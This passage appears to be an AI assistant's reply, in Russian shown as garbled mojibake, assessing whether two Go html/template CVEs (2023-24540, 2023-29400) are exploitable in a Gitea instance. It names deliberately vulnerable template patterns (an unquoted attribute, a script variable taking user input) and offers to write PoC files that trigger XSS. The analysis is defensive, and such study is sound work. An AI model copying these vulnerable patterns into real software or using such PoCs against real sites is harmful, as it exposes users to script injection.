       var foo = "{{.UserInput}}";
     </script>
     ```

     –ï—Å–ª–∏ –Ω–∏–∫–∞–∫–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥ –≤ `<script>` –Ω–µ –ø–æ–ø–∞–¥–∞–µ—Ç ‚Äî 24540 —Ç–µ–±–µ —Ç–æ–∂–µ –Ω–µ—á–µ–º ‚Äú–ø–æ—â—É–ø–∞—Ç—å‚Äù.

–° –±–æ–ª—å—à–æ–π –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å—é —Ç—ã —É–≤–∏–¥–∏—à—å, —á—Ç–æ:

* Gitea –≤ –∞—Ç—Ä–∏–±—É—Ç–∞—Ö –ø–æ—á—Ç–∏ –≤–µ–∑–¥–µ —Å—Ç–∞–≤–∏—Ç **–∫–∞–≤—ã—á–∫–∏**,
* –∞ –≤ `<script>` —é–∑–µ—Ä—Å–∫–∏–π –≤–≤–æ–¥ –≤–æ–æ–±—â–µ –Ω–µ —Å—É—ë—Ç.

–¢–æ–≥–¥–∞ **—ç—Ç–∏ –¥–≤–µ CVE –≤ —Ç–≤–æ—ë–º –∏–Ω—Å—Ç–∞–Ω—Å–µ ‚Äî ‚Äú—Ç–µ–æ—Ä–µ—Ç–∏—á–µ—Å–∫–∏ –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É—é—Ç‚Äù (–≤ Go), –Ω–æ –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–æ–≥–æ –≤–µ–∫—Ç–æ—Ä–∞ –≤ Gitea –Ω–µ—Ç**. –¢–æ –µ—Å—Ç—å —Å–∫–∞–Ω–µ—Ä —Ñ–æ—Ä–º–∞–ª—å–Ω–æ –ø—Ä–∞–≤, –Ω–æ —ç–∫—Å–ø–ª—É–∞—Ç–∞ ‚Äî –Ω–∏ –æ —á—ë–º.

---

## –ï—Å–ª–∏ —Ö–æ—á–µ—à—å –∏–º–µ–Ω–Ω–æ ‚Äú–ø–æ—á—É–≤—Å—Ç–≤–æ–≤–∞—Ç—å‚Äù —ç—Ç–∏ CVE —Ä—É–∫–∞–º–∏

–¢–æ–≥–¥–∞ —Å–∞–º—ã–π —á–µ—Å—Ç–Ω—ã–π –ø—É—Ç—å:

* —Å–¥–µ–ª–∞—Ç—å **–º–∏–∫—Ä–æ-Go-—Å–µ—Ä–≤–∏—Å** —Å —É—è–∑–≤–∏–º—ã–º —à–∞–±–ª–æ–Ω–æ–º –∏–∑ —Å—Ç–∞—Ç–µ–π –Ω–∞ cve.news,
* –ø—Ä–æ–≥–Ω–∞—Ç—å PoC, —É–≤–∏–¥–µ—Ç—å XSS / JS-–∏–Ω—ä–µ–∫—Ü–∏—é –≤ –±—Ä–∞—É–∑–µ—Ä–µ,
* –∑–∞–æ–¥–Ω–æ –ø–æ–Ω—è—Ç—å –º–µ—Ö–∞–Ω–∏–∫—É –¥–æ –∫–æ–Ω—Ü–∞.

–Ø –º–æ–≥—É –Ω–∞–∫–∏–¥–∞—Ç—å:

* –º–∞–ª–µ–Ω—å–∫–∏–π `main.go` –ø–æ–¥ **CVE-2023-29400** —Å `<button data-info={{.}}>`,
* –º–∞–ª–µ–Ω—å–∫–∏–π –ø—Ä–∏–º–µ—Ä –ø–æ–¥ **CVE-2023-24540** —Å `<script>var u="{{.}}";</script>` –∏ Unicode-–ø—Ä–æ–±–µ–ª–æ–º –≤ payload.

–¢—ã –∏—Ö —É —Å–µ–±—è —Å–æ–±–µ—Ä—ë—à—å (–º–æ–∂–Ω–æ –¥–∞–∂–µ –≤ —Ç–æ–º –∂–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ —Å Go), –æ—Ç–∫—Ä–æ–µ—à—å –≤ –±—Ä–∞—É–∑–µ—Ä–µ –∏ —É–≤–∏–¥–∏—à—å, –∫–∞–∫ –∏–º–µ–Ω–Ω–æ —ç–∫—Å–ø–ª–æ–π—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç.

–ï—Å–ª–∏ –æ–∫–µ–π —Ç–∞–∫–æ–π –≤–∞—Ä–∏–∞–Ω—Ç ‚Äî –¥–∞–ª—å—à–µ –º–æ–≥—É —Å—Ä–∞–∑—É –≤—ã–¥–∞—Ç—å –¥–≤–∞ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã—Ö PoC-—Ñ–∞–π–ª–∞ –ø–æ–¥ 24540 –∏ 29400.

[1]: https://www.cve.news/cve-2023-24540/ "CVE-2023-24540 - The Unicode Whitespace Escape in JavaScript & How Templating Goes Wrong"
[2]: https://www.cve.news/cve-2023-29400/ "CVE-2023-29400 - Unquoted HTML Attribute Injection in Templates ‚Äì How a Design Flaw Turns Empty Input into a Security Nightmare"
[3]: https://forum.gitea.com/t/where-is-the-custom-folder-inside-a-docker-installation/564?utm_source=chatgpt.com "Where is the \"custom\" folder inside a docker installation?"

